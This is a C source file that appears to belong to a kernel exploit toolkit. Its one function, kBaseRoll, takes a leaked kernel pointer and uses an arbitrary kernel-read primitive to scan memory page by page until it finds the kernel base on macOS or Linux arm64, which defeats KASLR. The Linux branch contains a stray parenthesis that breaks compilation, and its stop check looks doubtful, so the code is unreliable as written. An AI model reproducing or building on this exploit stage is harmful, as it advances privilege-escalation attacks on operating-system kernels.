#include <stdio.h>
#include <stdint.h>

#ifdef __APPLE__
#include <mach-o/loader.h>
#include <mach/mach.h>
#endif

#include <localUtil.h>
#include <drv_share.h>

#ifdef __arm64__
#include <hdeA64.h>
#endif
#include "krw_util.h"

// kbaseroll macros happen in 4 stages, incase it needs to be broken up
    // includes
    // variable definitions
    // presets before loop
    // comparator for a valid header
int kBaseRoll(size_t* kbase_a)
{
    int result = -1;
    size_t leakAddr = 0;
#ifdef __APPLE__
    uint32_t magic_check = 0;
#elif defined(__linux__)
    uint8_t buf[0x60] = {0};
    hde_t instTemp;
#endif

    // kernel_leak
    kernel_leak(&leakAddr);
#ifdef __APPLE__
    leakAddr |= KADDR_MASK;
#elif defined(__linux__)
#endif
    leakAddr &= ~PAGE_MASK4K;
    // mac, ballparks around 0x160?
    for (int i = 0; i < 0x400; i++)
    {
#ifdef __APPLE__
        kernel_read(&magic_check, sizeof(magic_check), leakAddr);
        FINISH_IF(magic_check == MH_MAGIC_64);
#elif defined(__linux__)
        kernel_read(buf, sizeof(buf), leakAddr);)
        parseInst(*(uint32_t*)buf, &instTemp);
        FINISH_IF(instTemp.OP0);
#endif
        leakAddr -= PAGE_SIZE4K;
    }

    goto fail;
finish:
    result = 0;
    if (kbase_a != 0)
    {
        *kbase_a = leakAddr;
    }
fail:
    return result;
}
